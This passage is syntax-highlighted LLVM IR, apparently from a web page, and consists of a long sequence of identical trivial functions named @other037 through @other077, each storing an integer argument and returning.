class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other037</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other038</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other039</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other040</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other041</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other042</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other043</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other044</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other045</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other046</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other047</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other048</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other049</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other050</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other051</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other052</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other053</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other054</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other055</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other056</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other057</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other058</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other059</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other060</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other061</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other062</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other063</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other064</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other065</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other066</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other067</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other068</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other069</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other070</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other071</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other072</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other073</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other074</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other075</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other076</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline nounwind optnone uwtable</span></span><br><span class="line"><span class="keyword">define</span> dso_local void <span class="title">@other077</span>(<span class="type">i32</span>) <span class="variable">#0</span> &#123;</span><br><span class="line">  <span class="variable">%2</span> <span class="operator">=</span> <span class="keyword">alloca</span> <span class="type">i32</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">store</span> <span class="type">i32</span> <span class="variable">%0</span><span class="punctuation">,</span> <span class="type">i32</span>* <span class="variable">%2</span><span class="punctuation">,</span> <span class="keyword">align</span> <span class="number">4</span></span><br><span class="line">  <span class="keyword">ret</span> void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">; Function Attrs: noinline 